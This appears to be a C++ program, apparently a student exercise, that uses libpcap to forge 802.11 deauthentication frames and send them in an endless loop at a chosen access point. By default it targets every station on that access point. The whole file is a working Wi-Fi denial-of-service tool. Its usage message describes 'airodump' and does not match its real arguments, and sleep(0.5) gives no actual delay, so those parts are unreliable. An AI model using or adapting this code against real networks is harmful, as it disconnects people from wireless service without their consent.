#include <cstdio>
#include <pcap.h>
#include <stdbool.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <iostream>
#include <cstring>
#include <map>
#include <mutex>
#include <thread>
#include <time.h>
#include <unistd.h>
#include "mac.h"
#include "radiotap.h"
#include "deauth.h"

using namespace std;


#pragma pack(push,1)

void usage() {
	printf("syntax: airodump <interface>\n");
	printf("sample: airodump wlan0\n");
}


typedef struct {
	char* dev_;
    Mac APMac;
    Mac StationMac;
} Param;

Param param;

struct Deauth_values{
    Mac APMac;
    Mac StationMac;
};

struct Deauth_pkt{
    RadiotapHeader rt_hdr;
    DeauthHeader deauth_hdr;
    IEEEWM reason_code;
};

void dump(char* buf, int size) {
	int i;
	for (i = 0; i < size; i++) {
		if (i != 0 && i % 16 == 0)
			printf("\n");
		printf("%02hhX ", buf[i]);
	}
	printf("\n");
}

bool parse(int argc, char* argv[]){
    if(argc < 3 || argc > 4){
        return false;
    }

    if(argc==3){
        param.dev_ = argv[1];
        param.APMac = Mac(argv[2]);
        param.StationMac = Mac("FF:FF:FF:FF:FF:FF");
    }

    else if(argc==4){
        param.dev_ = argv[1];
        param.APMac = Mac(argv[2]);
        param.StationMac = Mac(argv[3]);
    }

    return true;

}


int main(int argc, char* argv[]) {
    if(!parse(argc,argv)){
        usage();
        return -1;
    }

	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handler = pcap_open_live(param.dev_, BUFSIZ, 1, 0, errbuf);	//pcap을 여는 함수, (패킷을오픈할디바이스, 패킷최대크기, promiscuous, timeout, 에러버퍼)
	if (handler == NULL) {
		perror("pcap_open_live");
		return -1;
	}

	while (true){
        struct Deauth_pkt deauth_pkt;
        make_radiotap_hdr(&deauth_pkt.rt_hdr);
        make_deauth_hdr(param.StationMac, param.APMac, &deauth_pkt.deauth_hdr);
        dump((char *)&deauth_pkt,sizeof(deauth_pkt));

        cout << sizeof(deauth_pkt) << "  " << sizeof(struct Deauth_pkt) << "\n";
        
        if(pcap_sendpacket(handler, reinterpret_cast<const u_char *>(&deauth_pkt),sizeof(deauth_pkt))!=0){
			perror("pcap_sendpacket");
			return -1;
		}
        
        sleep(0.5);



        
    }

	//pcap_close(handler);	

}


#pragma pack(pop)
